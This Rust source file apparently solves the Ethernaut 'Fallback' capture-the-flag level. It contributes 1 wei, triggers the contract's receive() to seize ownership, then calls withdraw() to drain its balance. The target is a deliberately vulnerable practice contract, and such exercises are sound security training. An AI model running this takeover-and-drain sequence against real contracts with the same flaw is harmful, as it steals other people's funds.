use alloy::{
    primitives::U256,
    providers::Provider,
    rpc::types::TransactionRequest,
};
use async_trait::async_trait;
use ctf::ethernaut::lvl01_fallback::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::ActorProvider,
    ) -> eyre::Result<()> {
        let contract = Fallback::new(target.address, offender);

        println!("Calling contribute()...");
        let pending = contract.contribute().value(U256::from(1)).send().await?;
        let _receipt = pending.get_receipt().await?;

        println!("Calling receive()...");
        let tx = TransactionRequest::default()
            .to(target.address)
            .value(U256::from(1));
        let pending = offender.send_transaction(tx).await?;
        let _receipt = pending.get_receipt().await?;

        println!("Calling withdraw()...");
        let pending = contract.withdraw().send().await?;
        let _receipt = pending.get_receipt().await?;

        Ok(())
    }
}
